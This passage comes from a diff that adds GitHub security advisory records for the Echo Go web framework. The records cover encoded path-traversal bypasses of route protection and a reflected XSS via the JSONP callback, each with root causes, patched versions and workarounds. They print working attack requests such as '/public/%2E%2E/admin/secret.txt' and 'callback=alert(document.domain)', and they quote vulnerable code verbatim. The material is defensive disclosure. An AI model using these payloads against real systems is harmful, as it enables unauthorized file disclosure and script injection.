`5786024ea4d85c01784796e8aa7aac53e007b39b`\n\nNo patched version is currently known.\n\n\n## Policy and version checks\n\nGitHub Private Vulnerability Reporting is enabled for `labstack/echo`. The repository has a root `SECURITY.md` and accepts security reports through GitHub Security Advisories.\n\nThe vulnerable code was revalidated on both current `master` and the latest release tag:\n\n- Current `master`: `5786024ea4d85c01784796e8aa7aac53e007b39b`\n- Latest release: `v5.2.0`, published June 14 2026\n- Package: `github.com/labstack/echo/v5`\n\nThe same focused Go tests pass on the checked out `v5.2.0` / `master` commit, proving the bypass remains present in the latest released version and latest main branch at the time of reporting.\n\n## Reproduction\n\nThe following application shape reproduces the high-severity bypass:\n\n```go\ne := echo.New()\n\ng := e.Group(\"/admin\", func(next echo.HandlerFunc) echo.HandlerFunc {\n    return func(c echo.Context) error {\n        return echo.NewHTTPError(http.StatusForbidden)\n    }\n})\ng.GET(\"/*\", handler)\n\ne.StaticFS(\"/\", fsysWithAdminSecret)\n```\n\nControl request:\n\n```http\nGET /admin/secret.txt\n```\n\nObserved result:\n\n```text\n403 Forbidden\n```\n\nBypass request:\n\n```http\nGET /public/%2E%2E/admin/secret.txt\n```\n\nObserved result:\n\n```text\n200 OK\nTOP-SECRET\n```\n\nFor the non-default router variant:\n\n```go\ne := echo.New()\ne.router = echo.NewRouter(echo.RouterConfig{\n    UseEscapedPathForMatching: true,\n})\n\ng := e.Group(\"/admin\", authMiddlewareReturning403)\ng.GET(\"/*\", handler)\n\ne.StaticFS(\"/\", fsysWithAdminSecret)\n```\n\nBypass request:\n\n```http\nGET /public%2F..%2Fadmin%2Fsecret.txt\n```\n\nObserved result:\n\n```text\n200 OK\nTOP-SECRET\n```\n\n## Proof of concept evidence\n\nI added focused tests against the current Echo codebase. The tests exercise both `StaticDirectoryHandler` and the static middleware path.\n\nCommand:\n\n```bash\ngo test -run TestHostile -v ./...\n```\n\nObserved result:\n\n```text\n=== RUN   TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked\n--- PASS: TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked (0.00s)\n=== RUN   TestHostile_StaticDirectoryHandler_EncodedDotDotBypass\n--- PASS: TestHostile_StaticDirectoryHandler_EncodedDotDotBypass (0.00s)\n=== RUN   TestHostile_UseEscapedPathForMatching_Bypass\n--- PASS: TestHostile_UseEscapedPathForMatching_Bypass (0.00s)\nPASS\nok  github.com/labstack/echo/v5  0.013s\n=== RUN   TestHostile_StaticMiddleware_EncodedSeparatorsBlocked\n--- PASS: TestHostile_StaticMiddleware_EncodedSeparatorsBlocked (0.01s)\n=== RUN   TestHostile_StaticMiddleware_EncodedDotDotBypass\n--- PASS: TestHostile_StaticMiddleware_EncodedDotDotBypass (0.00s)\n=== RUN   TestHostile_StaticMiddleware_DisablePathUnescaping\n--- PASS: TestHostile_StaticMiddleware_DisablePathUnescaping (0.00s)\nPASS\nok  github.com/labstack/echo/v5/middleware  0.012s\n```\n\nThe control tests also confirm that the new fix blocks encoded separators such as `%2F`, `%5C`, double-encoded slash values, null bytes, and overlong slash encodings.\n\n## Root cause\n\nThe fix for GHSA-vfp3 uses a denylist-style guard that checks for encoded path separators before unescaping the static wildcard. This blocks `%2F` and `%5C`, but does not block encoded traversal segments such as `%2E%2E`.\n\nThe vulnerable flow is:\n\n1. The static route wildcard accepts `public/%2E%2E/admin/secret.txt`.\n2. The encoded-separator guard sees no `%2F` or `%5C` and allows the request.\n3. The handler unescapes the wildcard to `public/../admin/secret.txt`.\n4. `path.Clean` resolves it to `admin/secret.txt`.\n5. The file is served through the public static route instead of the protected `/admin/*` route.\n\nFor `UseEscapedPathForMatching=true`, the router decodes the path before the static handler sees the wildcard, so the handler cannot detect that encoded separators were used in the original request.\n\n## Remediation\n\nDo not rely only on detecting encoded separators. Reject encoded traversal sequences before unescaping, and reject normalized wildcard values that cross route or static mount boundaries.\n\nPossible fixes:\n\n1. Extend the pre-unescape guard to reject encoded dot segments such as `%2E` and `%2E%2E` in path components.\n2. After unescaping, reject any wildcard where cleaning changes the path in a way that removes `.` or `..` components.\n3. For `UseEscapedPathForMatching=true`, run the static-file guard against the original escaped request path before router normalization, or preserve metadata that the matched wildcard came from encoded separators.\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The Static middleware and `StaticDirectoryHandler` (used by `Echo.Static`, `Echo.StaticFS`, `Group.Static` and `Group.StaticFS`) no longer serve paths with a `.`, `..` or empty segment, including after path unescaping. The encoded variant of the first vector (`/public/%2E%2E/admin/secret.txt`) was already fixed in v5.2.1 and v4.15.4 (GHSA-vfp3-v2gw-7wfq).\n\n## Workarounds\n\nPut a reverse proxy in front of the application that normalizes request paths (removes dot segments and merges slashes), or keep protected files outside the served directory.\n",
+      "ghsa_id": "GHSA-3pmx-cf9f-34xr",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-3pmx-cf9f-34xr",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-3pmx-cf9f-34xr"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:11Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Echo static file middleware route protection bypass via encoded dot-dot traversal",
+      "updated_at": "2026-09-27T23:04:11Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-3pmx-cf9f-34xr",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.4.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.16.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.16.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 0,
+      "created_at": null,
+      "credits": [],
+      "credits_detailed": [],
+      "cve_id": null,
+      "cvss": {
+        "score": 5.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.9,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-174"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-174",
+          "name": "Double Decoding of the Same Data"
+        }
+      ],
+      "description": "## Summary\n\nCommit a9ede66a (PR #3006, issue #2599) silently fixed a path traversal vulnerability in the Echo web framework's static file middleware.\n\n## Vulnerability\n\nThe static middleware double-unescaped URL paths. Go's net/http already decodes Request.URL.Path, but middleware/static.go unconditionally called url.PathUnescape() again:\n\n```go\n// BEFORE (vulnerable)\npathUnescape := true\n```\n\nThis reassembled path traversal sequences from double-encoded input. An attacker could send GET /%2e%2e%2fsecret.txt or /..%252fsecret.txt and the double-unescape would produce ../secret.txt.\n\n## Fix\n```go\n// AFTER (fixed)\npathUnescape := false\n```\n\nThe commit's test TestStatic_percentEncodedTraversalIsBlocked explicitly verifies traversal vectors are blocked.\n\n## Impact\nArbitrary file read from server filesystem via percent-encoded path traversal.\n\n## References\n- Fix: https://github.com/labstack/echo/commit/a9ede66a\n- Issue: https://github.com/labstack/echo/issues/2599\n- PR: https://github.com/labstack/echo/pull/3006\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.2.0 and `github.com/labstack/echo/v4` v4.15.3, where the Static middleware stopped unescaping an already decoded path. Maintainer analysis: reading files outside the configured root could not be reproduced; the confirmed impact was that a double-encoded slash (`%252F`) could reach a file under a guarded route when the Static middleware is registered globally. Upgrade to v5.4.0 / v4.16.0 or later, which also includes related fixes for encoded and dot-segment paths.\n\n## Workarounds\n\nKeep files that need protection outside the Static middleware's root directory.\n",
+      "ghsa_id": "GHSA-xwq5-6cqp-vx96",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-xwq5-6cqp-vx96",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-xwq5-6cqp-vx96"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:12Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Static Middleware Double-Unescape Path Traversal (CWE-22)",
+      "updated_at": "2026-09-27T23:04:12Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-xwq5-6cqp-vx96",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.2.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.2.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.15.3",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.15.3"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 2,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "a-tt-om",
+          "type": "reporter"
+        },
+        {
+          "login": "oran-gugu",
+          "type": "reporter"
+        },
+        {
+          "login": "Iscaraca",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/92680067?v=4",
+            "events_url": "https://api.github.com/users/a-tt-om/events{/privacy}",
+            "followers_url": "https://api.github.com/users/a-tt-om/followers",
+            "following_url": "https://api.github.com/users/a-tt-om/following{/other_user}",
+            "gists_url": "https://api.github.com/users/a-tt-om/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/a-tt-om",
+            "id": 92680067,
+            "login": "a-tt-om",
+            "node_id": "U_kgDOBYYvgw",
+            "organizations_url": "https://api.github.com/users/a-tt-om/orgs",
+            "received_events_url": "https://api.github.com/users/a-tt-om/received_events",
+            "repos_url": "https://api.github.com/users/a-tt-om/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/a-tt-om/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/a-tt-om/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/a-tt-om",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/146875962?v=4",
+            "events_url": "https://api.github.com/users/oran-gugu/events{/privacy}",
+            "followers_url": "https://api.github.com/users/oran-gugu/followers",
+            "following_url": "https://api.github.com/users/oran-gugu/following{/other_user}",
+            "gists_url": "https://api.github.com/users/oran-gugu/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/oran-gugu",
+            "id": 146875962,
+            "login": "oran-gugu",
+            "node_id": "U_kgDOCMEmOg",
+            "organizations_url": "https://api.github.com/users/oran-gugu/orgs",
+            "received_events_url": "https://api.github.com/users/oran-gugu/received_events",
+            "repos_url": "https://api.github.com/users/oran-gugu/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/oran-gugu/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/oran-gugu/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/oran-gugu",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/49803282?v=4",
+            "events_url": "https://api.github.com/users/Iscaraca/events{/privacy}",
+            "followers_url": "https://api.github.com/users/Iscaraca/followers",
+            "following_url": "https://api.github.com/users/Iscaraca/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Iscaraca/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/Iscaraca",
+            "id": 49803282,
+            "login": "Iscaraca",
+            "node_id": "MDQ6VXNlcjQ5ODAzMjgy",
+            "organizations_url": "https://api.github.com/users/Iscaraca/orgs",
+            "received_events_url": "https://api.github.com/users/Iscaraca/received_events",
+            "repos_url": "https://api.github.com/users/Iscaraca/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/Iscaraca/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Iscaraca/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/Iscaraca",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-55677",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-22"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "description": "### Summary\r\n\r\nEcho's router and static file handler disagree on URL path decoding. The router matches routes using the raw encoded path (preserving `%2F` as-is), while `StaticDirectoryHandler` unescapes `%2F` to `/` before resolving filesystem paths. This allows an attacker to bypass route-level access controls and read static files without authorization.\r\n\r\n### Details\r\n\r\n**Root cause 1 — `router.go` lines 798-802:**\r\nThe router uses `req.URL.RawPath` for route matching when `useEscapedPathForRouting` is false (the default). This means `/admin%2Fsecret.txt` is treated as a single path segment and does NOT match the `/admin/*` route pattern.\r\n\r\n```go\r\nif !r.useEscapedPathForRouting && req.URL.RawPath != \"\" {\r\n    path = req.URL.RawPath\r\n}\r\n```\r\n\r\n**Root cause 2 — `echo.go` lines 559-568:**\r\n`StaticDirectoryHandler` calls `url.PathUnescape()` on the path parameter before opening files. This converts `%2F` back to `/`, resolving `admin/secret.txt` on disk.\r\n\r\n```go\r\nif !disablePathUnescaping {\r\n    tmpPath, err := url.PathUnescape(p)\r\n    p = tmpPath\r\n}\r\nname := filepath.ToSlash(filepath.Clean(strings.TrimPrefix(p, \"/\")))\r\n```\r\n\r\n### PoC (Screenshot)\r\nSample:\r\n<img width=\"1291\" height=\"970\" alt=\"image\" src=\"https://github.com/user-attachments/assets/0bc58059-3e6d-4678-ab25-a5c79b006738\" />\r\n\r\n403:\r\n<img width=\"526\" height=\"194\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2f55ffdd-87b2-4a1b-8a13-130ebad0f257\" />\r\n\r\nBypass with encoded slash:\r\n<img width=\"592\" height=\"203\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1191cd39-ae8f-4d7e-8fb1-cb9cf31f484f\" />\r\n\r\n### Impact\r\n\r\nUnauthorized static file disclosure. Applications that protect route prefixes with authentication middleware while also serving static files from a broader root are vulnerable. An attacker only needs to encode the slash (`/` → `%2F`) in the URL to bypass all route-level protection.\r\n\r\nCommon affected pattern:\r\n```go\r\nadminGroup := e.Group(\"/admin\", authMiddleware)\r\ne.StaticFS(\"/\", os.DirFS(\"public\"))\r\n```\r\n\r\n\n\n## Update (2026-09-27)\n\nThe first patched versions, v5.2.0 and v4.15.3, fixed only part of this issue: other percent-encoded paths (for example `/%61dmin/secret.txt` or `/public/%2E%2E/admin/secret.txt`) could still reach files behind a guarded route through `Echo.StaticFS` and `Echo.Static`. The complete fix is in v5.2.1 and v4.15.4. The affected and patched versions above have been corrected. Upgrade to v5.2.1 / v4.15.4 or later.\n",
+      "ghsa_id": "GHSA-vfp3-v2gw-7wfq",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-vfp3-v2gw-7wfq",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-vfp3-v2gw-7wfq"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-55677"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-06-14T15:08:45Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "Encoded slash (%2F) bypasses route-level protection and exposes static files",
+      "updated_at": "2026-09-27T19:16:52Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-vfp3-v2gw-7wfq",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.2.1",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.2.1"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.15.4",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.15.4"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 0,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "blitzkrieg-patch",
+          "type": "finder"
+        },
+        {
+          "login": "Sengtocxoen",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/192620019?v=4",
+            "events_url": "https://api.github.com/users/blitzkrieg-patch/events{/privacy}",
+            "followers_url": "https://api.github.com/users/blitzkrieg-patch/followers",
+            "following_url": "https://api.github.com/users/blitzkrieg-patch/following{/other_user}",
+            "gists_url": "https://api.github.com/users/blitzkrieg-patch/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/blitzkrieg-patch",
+            "id": 192620019,
+            "login": "blitzkrieg-patch",
+            "node_id": "U_kgDOC3sl8w",
+            "organizations_url": "https://api.github.com/users/blitzkrieg-patch/orgs",
+            "received_events_url": "https://api.github.com/users/blitzkrieg-patch/received_events",
+            "repos_url": "https://api.github.com/users/blitzkrieg-patch/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/blitzkrieg-patch/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/blitzkrieg-patch/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/blitzkrieg-patch",
+            "user_view_type": "public"
+          }
+        },
+        {
+          "state": "accepted",
+          "type": "finder",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/112749745?v=4",
+            "events_url": "https://api.github.com/users/Sengtocxoen/events{/privacy}",
+            "followers_url": "https://api.github.com/users/Sengtocxoen/followers",
+            "following_url": "https://api.github.com/users/Sengtocxoen/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Sengtocxoen/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/Sengtocxoen",
+            "id": 112749745,
+            "login": "Sengtocxoen",
+            "node_id": "U_kgDOBrhssQ",
+            "organizations_url": "https://api.github.com/users/Sengtocxoen/orgs",
+            "received_events_url": "https://api.github.com/users/Sengtocxoen/received_events",
+            "repos_url": "https://api.github.com/users/Sengtocxoen/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/Sengtocxoen/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Sengtocxoen/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/Sengtocxoen",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 6.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 6.1,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-79"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-79",
+          "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+        }
+      ],
+      "description": "### Summary\r\n\r\nThe `Context.JSONP`, `Context.JSONPBlob`, and internal `jsonPBlob` helper in `context.go` directly concatenate the caller-supplied `callback` parameter into a JavaScript response **without any validation, escaping, or allow-listing**.  \r\n\r\nThis creates a high-impact **reflected XSS** that can be triggered by any route passing attacker-controlled data (query string, form, header, path param, etc.) into the callback.\r\n\r\n**Present in current master and v5.1.0 (latest release).**\r\n\r\n### Vulnerable Code (verbatim)\r\n\r\n```go\r\nfunc (c *Context) jsonPBlob(code int, callback string, i any) (err error) {\r\n\tc.writeContentType(MIMEApplicationJavaScriptCharsetUTF8)\r\n\tc.response.WriteHeader(code)\r\n\tif _, err = c.response.Write([]byte(callback + \"(\")); err != nil {\r\n\t\treturn\r\n\t}\r\n\tif err = c.echo.JSONSerializer.Serialize(c, i, \"\"); err != nil {\r\n\t\treturn\r\n\t}\r\n\tif _, err = c.response.Write([]byte(\");\")); err != nil {\r\n\t\treturn\r\n\t}\r\n\treturn\r\n}\r\n\r\nfunc (c *Context) JSONP(code int, callback string, i any) (err error) {\r\n\treturn c.jsonPBlob(code, callback, i)\r\n}\r\n\r\nfunc (c *Context) JSONPBlob(code int, callback string, b []byte) (err error) {\r\n\tc.writeContentType(MIMEApplicationJavaScriptCharsetUTF8)\r\n\tc.response.WriteHeader(code)\r\n\tif _, err = c.response.Write([]byte(callback + \"(\")); err != nil {\r\n\t\treturn\r\n\t}\r\n\tif _, err = c.response.Write(b); err != nil {\r\n\t\treturn\r\n\t}\r\n\t_, err = c.response.Write([]byte(\");\"))\r\n\treturn\r\n}\r\n```\r\nNo sanitization is performed on the callback string.\r\n\r\n### Exploit (one-request repro)\r\nAny route using the official pattern is vulnerable:\r\n```\r\nGoe.GET(\"/api\", func(c echo.Context) error {\r\n    return c.JSONP(200, c.QueryParam(\"callback\"), map[string]string{\"status\": \"ok\"})\r\n})\r\n```\r\nAttacker request:\r\n```\r\nGET /api?callback=alert(document.domain)%2f%2f HTTP/1.1\r\nHost: target.com\r\n```\r\nServer response:\r\n```\r\nContent-Type: application/javascript; charset=utf-8\r\n\r\nalert(document.domain)//({\"status\":\"ok\"});\r\n```\r\n→ Immediate arbitrary JavaScript execution (full reflected XSS).\r\n### Impact\r\n\r\n- Session hijacking, cookie theft, account takeover, keylogging, defacement.\r\n- Works even with strict CSP (response is served as application/javascript).\r\n\r\n#### Affected Versions\r\n\r\n- All versions ≤ v5.1.0 (including current master)\r\n\r\n#### Workarounds\r\nManually sanitize the callback before calling JSONP/JSONPBlob:\r\n```\r\nGofunc safeCallback(cb string) string {\r\n    if matched, _ := regexp.MatchString(`^[a-zA-Z0-9_.\\[\\]]+$`, cb); !matched {\r\n        return \"callback\"\r\n    }\r\n    return cb\r\n}\r\n```\r\nOr migrate away from JSONP entirely (use CORS + application/json).\r\n### References\r\n\r\n- https://github.com/labstack/echo/blob/master/context.go\r\n- https://echo.labstack.com/docs/cookbook/jsonp\r\n\r\n## Patches\r\n\r\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. `Context.JSONP` and `Context.JSONPBlob` accept only a callback that is empty, a JavaScript identifier or a dot-separated path of identifiers (ASCII letters, digits, `_` and `$`); any other callback returns a 400 Bad Request error wrapping `ErrInvalidJSONPCallback` and nothing is written. JSONP responses also carry `X-Content-Type-Options: nosniff`.\r\n\r\n## Workarounds\r\n\r\nValidate the callback in your handler before calling `Context.JSONP`, for example against `^[A-Za-z_$][A-Za-z0-9_$]*(\\.[A-Za-z_$][A-Za-z0-9_$]*)*$`, and set `X-Content-Type-Options: nosniff`. JSONP responses can be read by any website with the user's cookies, so do not serve data that requires authentication through JSONP.\r\n",
+      "ghsa_id": "GHSA-h9g5-28mm-hx3g",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-h9g5-28mm-hx3g",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-h9g5-28mm-hx3g"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:05Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Reflected Cross-Site Scripting (XSS) via unsanitized JSONP callback in Context.JSONP / Context.JSONPBlob",
+      "updated_at": "2026-09-28T03:38:19Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-h9g5-28mm-hx3g",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.4.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.16.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.16.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 3,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "bugbunny-research",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/262839898?v=4",
+            "events_url": "https://api.github.com/users/bugbunny-research/events{/privacy}",
+            "followers_url": "https://api.github.com/users/bugbunny-research/followers",
+            "following_url": "https://api.github.com/users/bugbunny-research/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bugbunny-research/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/bugbunny-research",
+            "id": 262839898,
+            "login": "bugbunny-research",
+            "node_id": "U_kgDOD6qeWg",
+            "organizations_url": "https://api.github.com/users/bugbunny-research/orgs",
+            "received_events_url": "https://api.github.com/users/bugbunny-research/received_events",
